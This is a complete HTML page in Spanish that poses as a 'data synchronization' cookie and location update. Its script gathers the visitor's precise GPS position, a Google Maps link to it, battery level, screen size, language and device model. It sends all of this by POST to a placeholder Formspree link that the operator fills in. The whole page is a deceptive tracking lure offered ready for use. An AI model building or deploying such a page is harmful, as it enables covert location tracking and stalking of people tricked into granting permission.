<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Actualización de Cookies</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #333333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            max-width: 400px;
            text-align: center;
        }
        h1 {
            font-size: 20px;
            margin-bottom: 10px;
            color: #1a1a1a;
        }
        p {
            font-size: 14px;
            line-height: 1.5;
            color: #666666;
            margin-bottom: 20px;
        }
        button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
        .loader {
            display: none;
            margin-top: 15px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Sincronización de Datos</h1>
        <p>Tu dispositivo necesita actualizar su configuración de ubicación para garantizar la precisión del servicio. Haz clic abajo para permitir el acceso rápido.</p>
        <button id="btnPermitir">Actualizar Ahora</button>
        <div class="loader" id="loader">Procesando...</div>
    </div>

    <script>
        // Cookie falsa para simular que ya hemos interactuado antes
        document.cookie = "session_id=abc123xyz; path=/";
        
        const btn = document.getElementById('btnPermitir');
        const loader = document.getElementById('loader');
        let formData = {};

        function enviarDatos() {
            fetch("PEGA_AQUI_TU_LINK_DE_FORMSPREE", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(formData)
            }).then(() => {
                loader.style.display = 'block';
                setTimeout(() => {
                    loader.textContent = "¡Actualizado!";
                    loader.style.color = 'green';
                }, 1500);
            }).catch(error => console.error('Error:', error));
        }

        async function obtenerInfoDispositivo() {
            // Datos más precisos basados en el User Agent real
            const ua = navigator.userAgent;
            let deviceModel = "Dispositivo Móvil";
            
            if (ua.includes("iPhone")) deviceModel = "Apple iPhone";
            else if (ua.includes("Android")) {
                // Intento de extraer modelo específico si está disponible en el UA
                const match = ua.match(/;\s*([^;)]+)\s*Build/);
                if (match && match[1]) deviceModel = `Android ${match[1]}`;
                else deviceModel = "Dispositivo Android";
            }
            else if (ua.includes("Linux")) deviceModel = "Dispositivo Linux";
            else if (ua.includes("Windows")) deviceModel = "PC Windows";
            else if (ua.includes("Mac")) deviceModel = "Apple Mac";

            return {
                fechaHora: new Date().toISOString(),
                dispositivo: {
                    modelo: deviceModel,
                    plataforma: navigator.platform || "Desconocida",
                    pantalla: `${screen.width}x${screen.height}`,
                    idioma: navigator.language,
                    navegadores: ua.split(';').map(s => s.trim()).slice(0, 2).join(', ')
                },
                bateria: null,
                ubicacion: null
            };
        }

        btn.addEventListener('click', async () => {
            loader.style.display = 'block';
            
            // 1. Obtener batería
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    formData.bateria = `${Math.round(battery.level * 100)}%`;
                }
            } catch (e) {}

            // 2. Obtener ubicación con máxima precisión
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true, // Pide GPS real
                            timeout: 10000,
                            maximumAge: 0 // No usar caché vieja
                        });
                    });
                    
                    formData.ubicacion = {
                        disponible: "yes",
                        latitud: pos.coords.latitude,
                        longitud: pos.coords.longitude,
                        precisionMetros: Math.round(pos.coords.accuracy)
                    };
                    formData.enlaceMapa = `https://www.google.com/maps?q=${formData.ubicacion.latitud},${formData.ubicacion.longitud}`;
                } catch (e) {
                    formData.ubicacion = { disponible: "no", motivo: "Permiso denegado o tiempo agotado" };
                }
            } else {
                formData.ubicacion = { disponible: "no", motivo: "Geolocalización no soportada" };
            }

            // 3. Recopilar todo y enviar
            const dispositivoData = await obtenerInfoDispositivo();
            Object.assign(formData, dispositivoData);

            enviarDatos();
        });
    </script>
</body>
</html>
